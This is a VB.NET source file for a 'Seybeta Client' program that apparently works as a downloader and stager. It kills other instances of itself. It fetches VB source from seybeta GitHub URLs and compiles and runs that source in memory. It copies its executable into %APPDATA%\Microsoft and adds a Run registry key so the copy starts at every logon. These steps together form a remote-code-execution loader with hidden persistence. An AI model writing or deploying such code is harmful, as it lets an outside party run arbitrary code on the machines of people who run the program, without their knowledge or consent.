Imports System.CodeDom.Compiler
Imports System.Reflection
Imports System.Text
Imports System.IO

Public Class Main
    Const Beta As Boolean = True
    Dim sSourcePath As String = String.Empty
    Public sAssemblyPath As String = String.Empty

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If (Beta) Then
            Me.sSourcePath = "https://seybeta.github.io/Net-Beta/Seybeta%20Client/Main.vb"
            Me.sAssemblyPath = "https://seybeta.github.io/Net-Beta/Assemblies.txt"
        Else
            Me.sSourcePath = "https://raw.githubusercontent.com/seybeta/Net-Release/master/Seybeta%20Client/Main.vb"
            Me.sAssemblyPath = "https://raw.githubusercontent.com/seybeta/Net-Release/master/Assemblies.txt"
        End If

        For Each oProcess As Process In Process.GetProcesses
            If (oProcess.ProcessName.ToLower.Equals("seybeta")) Then
                If Not (oProcess.Id = Process.GetCurrentProcess().Id) Then
                    oProcess.Kill()
                End If
            End If
        Next

        Dim oDirectoryInfo As New DirectoryInfo(Directory.GetCurrentDirectory)

        If (Beta) Then
            Dim webClient As New Net.WebClient
            Dim streamReader As StreamReader = New StreamReader(webClient.OpenRead(Me.sSourcePath))
            CompileAndRunCode(streamReader.ReadToEnd)
        Else
            If (oDirectoryInfo.Name.ToString.Equals("Windows")) Then
                Dim webClient As New Net.WebClient
                Dim streamReader As StreamReader = New StreamReader(webClient.OpenRead(Me.sSourcePath))
                CompileAndRunCode(streamReader.ReadToEnd)
            Else
                Try
                    File.Copy(Application.ExecutablePath(), "%APPDATA%\Microsoft\seybeta.exe")
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
                                                  "Seybeta", "%APPDATA%\Microsoft\seybeta.exe")
                    Process.Start("%APPDATA%\Microsoft\seybeta.exe")
                Catch oException As Exception
                    MessageBox.Show("Trying running as Administrator.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                End Try
            End If
        End If

        End
    End Sub

    Public Function CompileAndRunCode(ByVal VBCodeToExecute As String) As Object
        Dim sReturn_DataType As String
        Dim sReturn_Value As String = ""
        Try
            Dim ep As New cVBEvalProvider

            Dim objResult As Object = ep.Eval(VBCodeToExecute)
            If ep.CompilerErrors.Count <> 0 Then
                Diagnostics.Debug.WriteLine("CompileAndRunCode: Compile Error Count = " & ep.CompilerErrors.Count)
                Diagnostics.Debug.WriteLine(ep.CompilerErrors.Item(0))
                Return "ERROR"
            End If
            Dim t As Type = objResult.GetType()
            If t.ToString() = "System.String" Then
                sReturn_DataType = t.ToString
                sReturn_Value = Convert.ToString(objResult)
            End If

        Catch ex As Exception
            Dim sErrMsg As String
            sErrMsg = String.Format("{0}", ex.Message)
        End Try

        Return sReturn_Value
    End Function
End Class
